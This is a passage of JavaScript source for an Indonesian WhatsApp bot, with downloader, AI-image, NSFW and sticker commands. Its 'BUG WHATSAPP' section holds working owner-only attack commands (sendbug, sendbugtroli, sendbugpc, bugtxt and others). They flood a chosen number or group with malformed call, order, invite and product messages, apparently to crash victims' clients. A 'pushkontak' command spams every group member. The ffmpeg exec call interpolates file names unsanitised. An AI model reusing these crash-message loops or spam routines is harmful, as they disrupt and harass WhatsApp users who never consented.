➤ sendbug (Bug Call) [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ sendbugtroli (Bug Troli) [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ sendbugpc (Bug Invite) [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ jadikatalog (Reply Gambar/Stiker) [ 𝗢𝗪𝗡𝗘𝗥 ]
━━━━━━━━━━━
  *ONLY GRUP* 
━━━━━━━━━━━
➤ sendbuggc (id group) [ 𝗢𝗪𝗡𝗘𝗥 ]
➤ sendbugtroligc (id group) [ 𝗢𝗪𝗡𝗘𝗥 ]
━━━━━━━━━━━━━━━
`,
}
}), { userJid: m.chat, quoted: m })
conn.relayMessage(from, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
}
break
case 'tqto': {
var mundur = await hitungmundur(4, 23)
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": '2',
"scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
"title": `*Hay ${pushname} 👋*
${shinchantime}
Saya Bot ${global.botname} yang di buat oleh developer ${global.ownername} untuk membantu para pengguna WhatsApp
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
( REAL TIME )
${tanggal}
${time}
${wita}
${wit}
━━━━━━━━━━━━━━━━━━━━━━━━━━
( *HITUNG MUNDUR IDUL FITRI 🌜* )
 ${mundur}
━━━━━━━━━━━━━━━━━━━━━━━━━━
  *THANKS BUAT TEMEN² KU* 
━━━━━━━━━━━━━━━━━━━━━
➤ Shield (Sauma)
➤ Zulfa
➤ Sawali
➤ Kreyu
➤ Ari
➤ Zimura (Indra)
➤ Bim-Bim
➤ Bang Iman
━━━━━━━━━━━━━━━
`,
}
}), { userJid: m.chat, quoted: m })
conn.relayMessage(from, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
}
break

case 'shutdown':
if (!isCreator) return paycall('*Khusus Owner Bot*')
await loading()
reply(`Goodbye🖐`)
await sleep(3000)
process.exit()
break
case 'restart':
if (!isCreator) return paycall('*Khusus Owner Bot*')
reply('In Process....')
await loading()
await sleep(15000)
exec('Sukses Merestart Ulang Bot🙏\nBot Kembali Pulih Tidak Delay Lagi🥰')
break

case 'pushkontak':{
if (!isCreator) return paycall('*Khusus Owner Bot*')
if (!m.isGroup) return paycall(`di group coy`)
if (!text) return paycall(`Teks Nya Kak?`)
let mem = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
let teksnye = `${q}`
reply(`*Mengirim pesan ke ${mem.length} orang, waktu selesai ${mem.length * 3} detik*`)
for (let m of mem) {
await sleep(3000)
conn.sendMessage(m, {text: `${teksnye}`}, {quoted: fkontak})
}
reply(`*Sukses mengirim pesan Ke ${mem.length} orang*`)
}
break
case 'owner': case 'crator':{
 conn.sendContact(from, global.owner, m)
}
break
case 'addprem':
if (!isCreator) return paycall('*Khusus Owner Bot*')
if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} 6282134110253`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await conn.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Enter a valid and registered number on WhatsApp!!!`)
prem.push(prrkek)
fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
reply(`The Number ${prrkek} Has Been Premium!`)
break
case 'delprem':
if (!isCreator) return paycall('*Khusus Owner Bot*')
if (!args[0]) return reply(`Use ${prefix+command} nomor\nExample ${prefix+command} 6282134110253`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = prem.indexOf(ya)
prem.splice(unp, 1)
fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
reply(`The Number ${ya} Has Been Removed Premium!`)
break
//AI MENU
case 'ai': {
if (`${global.xzn}` == 'YOUR_APIKEY_HERE') return m.reply(global.noapikey)
reply(global.wait)
  if (!text) return m.reply('Apa yang bisa saya bantu?')
    let response = await fetch(`https://api.akuari.my.id/ai/gpt?chat=${text}`)
    let data = await response.json()
   
  conn.sendText(from, data.respon, fkontak)
}
break
case 'jadianime': 
case 'toanime': {
if (!isPrem) return replyprem(mess.premium)
if (`${global.wtf}` == 'YOUR_APIKEY_HERE') return m.reply(global.noapikey)

if (!/video/.test(mime) && !/image/.test(mime)) throw `*Send/Reply the Video/Image With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply the Video/Image Caption* ${prefix + command}`
let media = await conn.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
let anu = await TelegraPh(media)
reply(global.wait)
  let response = `https://xzn.wtf/api/toanime?url=${util.format(anu)}&apikey=${global.wtf}`

conn.sendMessage(from, { image: { url: response}, caption: command },{ quoted: fkontak });
}
}
break
//========================WAIFU=========================//
case 'waifu': {
reply(global.wait)
            axios.get(`https://api.waifu.pics/sfw/waifu`)
               .then(({
                  data
               }) => {
                  conn.sendImage(m.chat, data.url, done, fkontak)
               })
         }
         break
         case 'loli':{
         reply(global.wait)
let heyy
if (/loli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/loli.json')
let yeha = heyy[Math.floor(Math.random() * heyy.length)]
conn.sendMessage(m.chat, { image: { url: yeha }, caption : done }, { quoted: fkontak })
}
break
//========================WAIFU=========================//

//========================NSFW=========================//
         case 'hentai' :
if (!isPrem) return replyprem(mess.premium)
reply(global.wait)
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`)         
conn.sendMessage(m.chat, { caption: done, image: { url:waifudd.data.url } }, { quoted: fkontak })
break
case 'hneko' :
if (!isPrem) return replyprem(mess.premium)
reply(global.wait)
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
conn.sendMessage(m.chat, { caption: done, image: { url:waifudd.data.url } }, { quoted: fkontak })
break
case 'trap' :
if (!isPrem) return replyprem(mess.premium)
reply(global.wait)
    waifudd = await axios.get(`https://waifu.pics/nsfw/trap`)
conn.sendMessage(m.chat, { caption: done, image: { url:waifudd.data.url } }, { quoted: fkontak })
break
case 'blowjob' :
if (!isPrem) return replyprem(mess.premium)
reply(global.wait)
    waifudd = await axios.get(`https://waifu.pics/nsfw/blowjob`)
conn.sendMessage(m.chat, { caption: done, image: { url:waifudd.data.url } }, { quoted: fkontak })
break
case 'pussy' :
if (!isPrem) return replyprem(mess.premium)
reply(global.wait)
conn.sendMessage(from, { image: { url: `https://api.lolhuman.xyz/api/random2/${command}?apikey=${apikey}` } })
break
case 'ecchi' :
if (!isPrem) return replyprem(mess.premium)
reply(global.wait)
conn.sendMessage(from, { image: { url: `https://api.lolhuman.xyz/api/random/nsfw/${command}?apikey=${apikey}` } })
break
case 'solog' :
if (!isPrem) return replyprem(mess.premium)
reply(global.wait)
conn.sendMessage(from, { image: { url: `https://api.lolhuman.xyz/api/random2/${command}?apikey=${apikey}` } })
break
//========================NSFW=========================//

case 'hd': {
if (!isPrem) return replyprem(mess.premium)
const alias = {
    "hd" : "torch-srgan",
  };
  const aliasCommand = alias[command] || command;
  if (`${global.wtf}` == 'YOUR_APIKEY_HERE') {
    return m.reply(global.noapikey);
  }

  if (!/video/.test(mime) && !/image/.test(mime)) {
    throw `*Send/Reply the Video/Image With Caption* ${prefix + command}`;
  }

  if (!quoted) {
    throw `*Send/Reply the Video/Image Caption* ${prefix + command}`;
  }
  let error;
try {
  let media = await conn.downloadAndSaveMediaMessage(quoted);

  if (/image/.test(mime)) {
    let anu = await TelegraPh(media);
    reply(global.wait);

    const response = `https://xzn.wtf/api/waifu2x?url=${anu}&apikey=nerobot`

    conn.sendMessage(from, { image: { url: response }, caption: '𝑭𝒐𝒕𝒐 𝒃𝒆𝒓𝒉𝒂𝒔𝒊𝒍 𝒅𝒊 𝒆𝒏𝒉𝒂𝒏𝒄𝒆 𝒌𝒆 4𝑲\n𝑩𝒚: 𝑺𝒉𝒊𝒏𝑪𝒉𝒂𝒏 𝑺𝒆𝒏𝒑𝒂𝒊🐼❤️' }, { quoted: fkontak });
  }
} catch (er) {
					error = true;
				} finally {
					if (error) {
						reply("Proses Gagal :(");
					}
					}
					}
break
case 'removebg': {
if (!isPrem) return replyprem(mess.premium)
const alias = {
    "removebg" : "removebg"
  };
  const aliasCommand = alias[command] || command;
  if (`${global.wtf}` == 'YOUR_APIKEY_HERE') {
    return m.reply(global.noapikey);
  }

  if (!/video/.test(mime) && !/image/.test(mime)) {
    throw `*Send/Reply the Video/Image With Caption* ${prefix + command}`;
  }

  if (!quoted) {
    throw `*Send/Reply the Video/Image Caption* ${prefix + command}`;
  }
  let error;
try {
  let media = await conn.downloadAndSaveMediaMessage(quoted);

  if (/image/.test(mime)) {
    let anu = await TelegraPh(media);
    reply(global.wait);

    const response = `https://xzn.wtf/api/removebg?url=${anu}&apikey=nerobot`
    

    conn.sendMessage(from, { image: { url: response }, caption: 'nih' }, { quoted: fkontak });
  }
} catch (er) {
					error = true;
				} finally {
					if (error) {
						reply("Proses Gagal :(");
					}
					}
					}
break
case 'remini': {
			if (!/image/.test(mime)) return paycall(`Send/Reply Foto Dengan Caption ${prefix + command}`)
			reply(global.wait)
			const { remini } = require('./lib/remini')
			let media = await quoted.download()
			let proses = await remini(media, "enhance")
			conn.sendMessage(m.chat, { image: proses, caption: `𝑭𝒐𝒕𝒐 𝒅𝒂𝒉 𝒋𝒂𝒅𝒊 𝑯𝑫 𝒃𝒍𝒐𝒎 𝒃𝒂𝒏𝒈? \n𝑩𝒚: 𝑺𝒉𝒊𝒏𝑪𝒉𝒂𝒏 𝑺𝒆𝒏𝒑𝒂𝒊🐼❤️`}, { quoted: fkontak})
			}
			break
case 'imgeditor': {
  if (`${global.wtf}` == 'YOUR_APIKEY_HERE') {
    return m.reply(global.noapikey);
  }
  if (!isPrem) return replyprem(mess.premium)
if (!text) return m.reply(`Reply image with ${command} blue eyes with cute face and white skin`)
let error;
try{
  if (!/image/.test(mime)) {
    throw `*Send/Reply the Image With Caption* ${prefix + command}`;
  }
  if (!quoted) {
    throw `*Send/Reply the Video/Image Caption* ${prefix + command}`;
  }
  
  let media = await conn.downloadAndSaveMediaMessage(quoted);

  if (/image/.test(mime)) {
    let anu = await TelegraPh(media);
    m.reply(global.wait);

    let response = `https://xzn.wtf/api/image-editor?url=${anu}&text=${text}&apikey=kreya`
    conn.sendMessage(from, { image: { url: response}, caption: 'nih' }, { quoted: fkontak });
  }
} catch (er) {
					error = true;
				} finally {
					if (error) {
						m.reply("Proses Gagal :(");
					}
					}
					}
break
case 'jojo':
case 'anime2d':
case 'cartoon3d':
case 'pretty':
case 'romancecomic':
case 'maid':
case 'superhero':
case 'watercolor':
case 'doodle':
case 'americacomic':
case 'starrygirl': {
  const alias = {
    "anime2d": "anime_2d",
    "cartoon3d": "cartoon_3d",
    "pretty": "pretty_soldier",
    "jojo": "bizarre",
    "maid": "maid_dressing",
    "romancecomic": "romance_comic",
    "superhero": "superhero_comic",
    "watercolor": "watercolor",
    "doodle": "doodle",
    "americancomic": "america-comic",
    "starrygirl": "starry_girl"
  };
  const aliasCommand = alias[command] || command;
  if (!isPrem) return replyprem(mess.premium)

  if (`${global.wtf}` == 'YOUR_APIKEY_HERE') {
    return m.reply(global.noapikey);
  }

  if (!/video|image/.test(mime)) {
    throw `*Send/Reply the Video/Image With Caption* ${prefix + command}`;
  }

  if (!quoted) {
    throw `*Send/Reply the Video/Image Caption* ${prefix + command}`;
  }
let error;
try {
  let media = await conn.downloadAndSaveMediaMessage(quoted);

  if (/image/.test(mime)) {
    let anu = await TelegraPh(media);
    reply(global.wait);

    const response = await fetchJson(`https://xzn.wtf/api/aimirror?&apikey=kreya&url=${anu}&filter=${aliasCommand}`);
   
    conn.sendMessage(from, { image: { url: response.generated_image_addresses[0] }, caption: 'nih' }, { quoted: fkontak });
  }
} catch (er) {
					error = true;
				} finally {
					if (error) {
						reply("Proses Gagal :(");
					}
					}
					}
break
case 'textimg' : {
if (`${global.wtf}` == 'YOUR_APIKEY_HERE') {
    return m.reply(global.noapikey);
  }

if (!isPrem) return replyprem(mess.premium)
if (!text) return m.reply(`${command} smile face with blush and blue hair`)
    const response = await fetchJson(`https://xzn.wtf/api/midjourney?text=${text}&apikey=kreya`);
   if (response.status == 'FAILURE') return m.reply('gagal')
   let error;
   try {
    conn.sendMessage(from, { image: { url: response.imageUrl }, caption: 'nih' }, { quoted: fkontak });
  }catch (er) {
					error = true;
				} finally {
					if (error) {
						m.reply("Proses Gagal :(");
					}
					}
					}
  //END AI MENU
break
//========================SPOTIFY=========================//
case 'spotifysearch': {
if (!text) throw `*🚩 Contoh:* ${usedPrefix + command} Lathi`;  
  let teks = '';
  try {
    const api = await fetch(`https://api.betabotz.org/api/search/spotify?query=${text}&apikey=hYnG4TVp`);
    let json = await api.json();
    let res = json.result.data;    
    for (let i in res) {
      teks += `*${parseInt(i) + 1}.* *Title:* ${res[i].title}\n`;
      teks += `*Duration:* ${res[i].duration}\n`;
      teks += `*Popularity:* ${res[i].popularity}\n`;
      teks += `*Link:* ${res[i].url}\n\n`;
    }     
    await conn.relayMessage(m.chat, {
     extendedTextMessage:{
                text: teks, 
                contextInfo: {
                     externalAdReply: {
                        showAdAttribution: true,
                        containsAutoReply: true,
                        title: `*Hay ${pushname} 👋* ${shinchantime}\n𝙎𝙋𝙊𝙏𝙄𝙁𝙔 𝙎𝙀𝘼𝙍𝘾𝙃 𝘽𝙮 : ${global.ownername}`,
                        body: `${tanggal} ××× ${time}`,
                        mediaType: 1,
                        previewType: 0,
                        renderLargerThumbnail: true,
                        thumbnailUrl: 'https://www.scdn.co/i/_global/open-graph-default.png',
                        sourceUrl: 'https://youtube.com/channel/UCqCZmaSvnbsre9EKEyGtviQ'
                    }
                }, mentions: [m.sender]
    }}, {})
  } catch (e) {
    throw `🚩 *Gagal Memuat Data!*`;
  }
};
break
case "spotify":{
if (!text) return paycall(`Di mana tautannya?`)
reply(global.wait)
        const Spotify = require('./lib/spotify')
        const spotify = new Spotify(text)
        const info = await spotify.getInfo()
        if ((info).error) return paytod(`The link you provided is not spotify link`)
        const { name, artists, album_name, release_date, cover_url } = info
        const details = `🐼 *Title:* ${name || ''}\n🐼 *Artists:* ${(artists || []).join(
            ','
        )}\n🐼 *Album:* ${album_name}\n🐼 *Release Date:* ${release_date || ''}`
       const response = await conn.sendMessage(m.chat, { image: { url: cover_url }, caption: details }, { quoted: fkontak })
        const bufferpotify = await spotify.download()
        await conn.sendMessage(m.chat, { audio: bufferpotify }, { quoted: response })
        }
break
//========================TIKTOK=========================//
case 'tiktoknowm': case 'ttnowm': case 'tiktok': case 'tt': {
if (!args[0]) return paycall( `Example : ${prefix + command} link`)
reply(global.wait)
  let res = await fetch(`https://api.zeltoria.my.id/api/download/tiktok?url=${args[0]}&apikey=Elistz`)
  let x = await res.json()
  let anu = x.result
  let cap = `${global.done}`
  conn.sendMessage(m.chat, { video: { url: anu.video.no_watermark_hd }, caption: cap }, { quoted: fkontak})
}
break
case 'tiktokmp3': case 'ttmp3': case 'ttaudio': {
if (!text) return paycall( `Example : ${prefix + command} link`)
if (!q.includes('tiktok')) return paycall(`Link Invalid!!`)
reply(global.wait)
require('./lib/tiktok').Tiktok(q).then( data => {
conn.sendMessage(m.chat, { audio: { url: data.audio }, mimetype: 'audio/mp4' }, { quoted: m })
})
}
break
case 'tt2': {
if (!q) return paycall( `Example : ${prefix + command} link`)
reply(global.wait)
let res = await fetch(`https://api.akuari.my.id/downloader/tiktok?link=${q}`)
let data = await res.json()
let json = data.respon
let cap = `𝑨𝑼𝑻𝑯𝑶𝑹 = ${json.author}\n𝐋𝐢𝐤𝐞 = ${json.like}\n𝐂𝐨𝐦𝐦𝐞𝐧𝐭 = ${json.comment}\n𝐒𝐡𝐚𝐫𝐞 = ${json.share}\n𝑫𝑬𝑺𝑪𝑹𝑰𝑷𝑻𝑰𝑶𝑵 = ${json.description}`
conn.sendMessage(m.chat, { video: { url: json.media }, caption: cap }, { quoted: fkontak})
};
break
case 'ttmp3backup': {
if (!q) return paycall( `Example : ${prefix + command} link`)
reply(global.wait)
let res = await fetch(`https://api.akuari.my.id/downloader/tiktok?link=${q}`)
let data = await res.json()
let json = data.respon
conn.sendMessage(m.chat, { audio: { url: json.music }, mimetype: 'audio/mp4' }, { quoted: fkontak })
};
break

//========================AKSARA JAWA=========================//
case 'aksarajawa': {
if (!text) return paycall( `Ketik sesuatu biar ketikan lu di generate jadi aksarajawa`)
reply(global.wait)
let response = await fetch(`https://api.akuari.my.id/other/latinkeaksara?query=${text}`)
let data = await response.json()
   
  conn.sendText(from, data.hasil, fkontak)
}
break
case 'latin': {
if (!text) return paycall( `Caranya kirim teks aksara jawa biar di translate in sama bot`)
reply(global.wait)
let response = await fetch(`https://api.akuari.my.id/other/aksarakelatin?query=${text}`)
let data = await response.json()
   
  conn.sendText(from, data.hasil, fkontak)
}
break

case 'lens': case 'googlelens': {
if (!/image/.test(mime)) return paycall(`Fitur Lens/Google Lens adalah fitur untuk mengambil teks di gambar, kegunaannya biar mudah ambil teks yang di foto, fitur ini masih tahap beta yang di kembangkan oleh developer shinchan senpai💖, cara pakainya kalian kirim foto yang ada teks nya lalu kalian (ketik : ${prefix} lens / ${prefix} googlelens).`)
reply(global.wait)
let media = await conn.downloadAndSaveMediaMessage(quoted);

  if (/image/.test(mime)) {
    let anu = await TelegraPh(media)
let response = await fetch(`https://api.akuari.my.id/other/ocr?img=${anu}`)
let data = await response.json()

  conn.sendText(from, data.result, fkontak)
}
}
break

case 'pixivdl': {
if (args.length == 0) return paycall(`Example: ${prefix + command} 63456028`)
reply(global.wait)
pixivid = args[0]
let ini_buffer = await fetch(`https://api.akuari.my.id/downloader/pixiv?id=${pixivid}&ext=.jpg`)
await conn.sendMessage(from, { image: { url: ini_buffer.url }, caption: 'nih' }, { quoted: fkontak })
}
break
case 'nhentai': {
if (args.length == 0) return paycall(`Example: ${prefix + command} 344253`)
reply(global.wait)
henid = args[0]
let res = await fetch(`https://xzn.wtf/api/nhentai?code=${henid}&apikey=nerobot`)
let data = await res.json()
let cap = `${data.title}`
await conn.sendMessage(m.chat, { document: { url: data.download }, mimetype: 'application/pdf' }, { fileName: `${cap}.pdf`}, { quoted : m })
}
break
//=========================================================//
/*case 'tt':{ 
if (!text) return reply( `Example : ${prefix + command} link`)
if (!q.includes('tiktok')) return reply(`Link Invalid!!`)
paytod(global.wait)
require('./lib/tiktok').Tiktok(q).then( data => {
conn.sendMessage(m.chat, { video: { url: data.nowm }, mimetype: 'video/mp4'}, {quoted: fkontak })
})
}
break
case 'ttaudio':{
if (!text) return reply( `Example : ${prefix + command} link`)
if (!q.includes('tiktok')) return reply(`Link Invalid!!`)
paytod(global.wait)
require('./lib/tiktok').Tiktok(q).then( data => {
conn.sendMessage(m.chat, { audio: { url: data.audio }, mimetype: 'audio/mp4' }, { quoted: fkontak })
})
}
break*/
//========================TIKTOK=========================//
case 'id' :
        if (!isCreator) return m.reply(`*khusus Owner*`)
        paytod(`${m.chat}`)
        break
//========================BUG WHATSAPP=========================//
case 'sendbug': {
if (!isCreator) return m.reply(`*khusus Owner*`)
let memek = text.split("|")[0]+'@s.whatsapp.net'
let nomor = memek.replace(" ", "")
let jumlah = text.split("|")[1]
let secon = text.split("|")[2]
for (let i = 0; i < jumlah ; i++){
var scheduledCallCreationMessage = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": '1',
"scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
"title": `${weg}\n${tizi}`,
}
}), { userJid: m.chat, quoted: m })
conn.relayMessage(nomor, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(60* secon)
}
}
break
case 'sendbuggc': {
if (!isCreator) return m.reply(`*khusus Owner*`)
let memek = text.split("|")[0]+'@g.us'
let nomor = memek.replace(" ", "")
let jumlah = text.split("|")[1]
let secon = text.split("|")[2]
for (let i = 0; i < jumlah ; i++){
var scheduledCallCreationMessage = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": '1',
"scheduledTimestampMs": `${moment(1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}`,
"title": `${weg}\n${tizi}`,
}
}), { userJid: m.chat, quoted: m })
conn.relayMessage(nomor, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(60* secon)
}
}
break
case 'sendbugpc': {
if (!isCreator) return m.reply(`*khusus Owner*`)
num = q.split('|')[0]+'@s.whatsapp.net'
jumlah = q.split('|')[1]
let secon = text.split("|")[2]
for (let i = 0; i < jumlah; i++) {
var invite = generateWAMessageFromContent(num, proto.Message.fromObject({
"groupInviteMessage": {
         "groupJid": "120363144695962190@g.us",
	     "inviteCode": "63bqvAyYvuOQJtwf",
		 "inviteExpiration": "1689703732",
         "groupName": `${vapi()} ${philips}`,
         "jpegThumbnail": thumb,
         "caption": `${num}`
}
}), { userJid: m.chat, quoted: fbugstik })
conn.relayMessage(num, invite.message, { messageId: invite.key.id })
await conn.sendMessage(num, {text: `${weg} ${weg}`}, {quoted: fbugtext})
await sleep(60* secon)
}
}
break
case 'sendbugtroli': {
if (!isCreator) return m.reply(`*khusus Owner*`)
let memek = text.split("|")[0]+'@s.whatsapp.net'
let nomor = memek.replace(" ", "")
let jumlah = text.split("|")[1]
let secon = text.split("|")[2]
for (let i = 0; i < jumlah ; i++){
var troli = generateWAMessageFromContent(nomor, proto.Message.fromObject({
"orderMessage": {
                  "sellerJid": "6282134110253@s.whatsapp.net",
                  "itemCount": 7777777,
                  "message": `${weg} ${weg}`,
                  "orderTitle": "⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗"
}
}), { userJid: m.chat, quoted: fbugstik })
conn.relayMessage(nomor, troli.message, { messageId: troli.key.id })
await sleep(60* secon)
}
}
break
case 'sendbugtroligc': {
if (!isCreator) return m.reply(`*khusus Owner*`)
let memek = text.split("|")[0]+'@g.us'
let nomor = memek.replace(" ", "")
let jumlah = text.split("|")[1]
let secon = text.split("|")[2]
for (let i = 0; i < jumlah ; i++){
var troligc = generateWAMessageFromContent(nomor, proto.Message.fromObject({
"orderMessage": {
                  "sellerJid": "6282134110253@s.whatsapp.net",
                  "itemCount": 7777777,
                  "message": `${weg} ${weg}`,
                  "orderTitle": "⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗"
}
}), { userJid: m.chat, quoted: fbugstik })
conn.relayMessage(nomor, troligc.message, { messageId: troligc.key.id })
await sleep(60* secon)
}
}
break
case 'sendbugstik': {
if (!isCreator) return m.reply(`*khusus Owner*`)
let memek = text.split("|")[0]+'@s.whatsapp.net'
let nomor = memek.replace(" ", "")
let jumlah = text.split("|")[1]
for (let i = 0; i < jumlah ; i++){
conn.sendMessage(nomor, {text: `${weg} ${weg}`}, {quoted: fbugstik})
await sleep(1000)
conn.sendMessage(nomor, {text: `${weg} ${weg}`}, {quoted: fbugstik})
await sleep(1000)
conn.sendMessage(nomor, {text: `${weg} ${weg}`}, {quoted: fbugstik})
await sleep(1000)
conn.sendMessage(nomor, {text: `${weg} ${weg}`}, {quoted: fbugstik})
await sleep(1000)
conn.sendMessage(nomor, {text: `${weg} ${weg}`}, {quoted: fbugstik})
await sleep(1000)
}
}
break
case 'bugtxt': {
if (!isCreator) return m.reply(`*khusus Owner*`)
 let memek = text.split("|")[0]+'@s.whatsapp.net'
let nomor = memek.replace(" ", "")
let jumlah = text.split("|")[1]
for (let i = 0; i < jumlah ; i++){
conn.sendMessage(nomor, {text: `${weg} ${weg}`}, {quoted: fbugtext})
await sleep(1000)
conn.sendMessage(nomor, {text: `${weg} ${weg}`}, {quoted: fbugtext})
await sleep(1000)
conn.sendMessage(nomor, {text: `${weg} ${weg}`}, {quoted: fbugtext})
await sleep(1000)
conn.sendMessage(nomor, {text: `${weg} ${weg}`}, {quoted: fbugtext})
await sleep(1000)
conn.sendMessage(nomor, {text: `${weg} ${weg}`}, {quoted: fbugtext})
await sleep(1000)
}
}
break
case 'jadikatalog': {
if (!isCreator) return paycall(`*khusus Owner*`)
let media = await quoted.download()
reply(global.wait)
var messa = await prepareWAMessageMedia({ image: media }, { upload: conn.waUploadToServer })
var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "",
"jpegThumbnail": thumb,
"title": `${text} ${philips}`,
"description": `${text} ${vapi()}`,
"productImageCount": 999999999,
"firstImageId": 1,
"retailerId": `〔 ıll ☄︎ ⫹⫺ ᴺᵉʳᵒ☃︎ˢᵉⁿᵖᵃⁱ 浤 ☄︎ llı 〕`,
"bodyText": `${text}`,
"footerText": `${text}`,
"url": "https://youtube.com/channel/UCqCZmaSvnbsre9EKEyGtviQ"
},
"businessOwnerJid": "6282134110253@s.whatsapp.net",
"contextInfo": {
"forwardingScore": 150,
"isForwarded": true
}
}
}), { userJid: m.chat, quoted: fkontak })
conn.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
}
break
case 'tokatalog': {
if (!isCreator) return m.reply(`*khusus Owner*`)
let media = await quoted.download()
reply(global.wait)
var messa = await prepareWAMessageMedia({ image: media }, { upload: conn.waUploadToServer })
var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "",
"jpegThumbnail": thumb,
"title": `${text}`,
"description": `${text}`,
"productImageCount": 999999999,
"firstImageId": 1,
"retailerId": `〔 ıll ☄︎ ⫹⫺ ᴺᵉʳᵒ☃︎ˢᵉⁿᵖᵃⁱ 浤 ☄︎ llı 〕`,
"bodyText": `${text}`,
"footerText": `${text}`,
"url": "https://youtube.com/channel/UCqCZmaSvnbsre9EKEyGtviQ"
},
"businessOwnerJid": "6282134110253@s.whatsapp.net",
"contextInfo": {
"forwardingScore": 150,
"isForwarded": true
}
}
}), { userJid: m.chat, quoted: fkontak })
conn.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
}
break
case 'testaja': {
if (!isCreator) return m.reply(`*khusus Owner*`)
var interactiveMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"interactiveMessage": {
						"header": {
							"title": "ShinChan",
							"subtitle": "Jumlah 1"
						},
						"nativeFlowMessage": {
							"buttons": [
								{
									"name": "review_and_pay",
									"buttonParamsJson": { 
									"currency": "IDR",
									"external_payment_configurations":[
									{
									"uri": "",
									"type": "payment_instruction",
									"payment_instruction": "Anu"
									}
									],
									"payment_configuration":"",
									"payment_type":"",
									"total_amount": 10000,
									"reference_id":"4N003CFPZ6N",
									"type":"physical-goods",
									"payment_status":"captured",
									"payment_timestamp": 1696052026,
									"order":{"status":"completed","description":"","subtotal": 10000,
									"items":[
									{
									"retailer_id": "custom-item-ef3e2769-f40f-410f-9da4-5b3478de1bc4",
									"name":"ShinChan",
									"amount": 10000,
									"quantity":1}]}}
								}
							]
						}
					}
			}), { userJid: m.chat, quoted: m })
conn.relayMessage(from, interactiveMessage.message, { messageId: interactiveMessage.key.id })
}
break
//========================BUG WHATSAPP=========================//
case 'setpp': {
if (!isCreator) return m.reply(`*khusus Owner*`)
if (!quoted) return paycall(`Send/Reply Images With Captions ${prefix+command}`)
if (!/image/.test(mime)) return paycall(`Send/Reply Image With Caption ${prefix + command}`)
if (/webp/.test(mime)) return paycall(`Send/Reply Image With Caption ${prefix + command}`)
reply(global.wait)
var media = await conn.downloadAndSaveMediaMessage(quoted)
try {
if (args[0] == "/full") {
const { generateProfilePicture } = require("./lib/myfunc")
var { img } = await generateProfilePicture(media)
await conn.query({ tag: 'iq',attrs: { to: botNumber, type:'set', xmlns: 'w:profile:picture'}, content: [{ tag: 'picture', attrs: { type: 'image' }, content: img }]})
} else { await conn.updateProfilePicture(botNumber, { url: media }) }
reply('DONE')
} catch { reply('Gagal Mengganti Photo Profile') }
}
break
//STICKER
case 's': case 'sticker': case 'stiker': {
if (!quoted) return paycall(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
reply(global.wait)
if (quoted.isAnimated) {
               let media = await conn.downloadAndSaveMediaMessage(quoted)
               let webpToMp4 = await webp2mp4File(media)
               let encmedia = await conn.sendVideoAsSticker(m.chat, webpToMp4.result, m, {
                  packname: global.packname,
                  author: global.author
               })
               await fs.unlinkSync(encmedia)
            } else if (/image/.test(mime)) {
               let media = await quoted.download()
               let encmedia = await conn.sendImageAsSticker(m.chat, media, m, {
                  packname: global.packname,
                  author: global.author
               })
               await fs.unlinkSync(encmedia)
            } else if (/video/.test(mime)) {
               if ((quoted.msg || quoted).seconds > 11) return paycall('Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds')
               let media = await quoted.download()
               let encmedia = await conn.sendVideoAsSticker(m.chat, media, m, {
                  packname: global.packname,
                  author: global.author
               })
               await fs.unlinkSync(encmedia)
            } else {
               paycall(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
            }
         }
         break
case 'toimg': {
	reply(global.wait)
	const getRandom = (ext) => {
            return `${Math.floor(Math.random() * 10000)}${ext}`
        }
        if (!m.quoted) return paycall(`_Reply to Any Sticker._`)
        let mime = m.quoted.mtype
if (mime =="imageMessage" || mime =="stickerMessage")
{
        let media = await conn.downloadAndSaveMediaMessage(m.quoted)
        let name = await getRandom('.png')
        exec(`ffmpeg -i ${media} ${name}`, (err) => {
        	fs.unlinkSync(media)
            let buffer = fs.readFileSync(name)
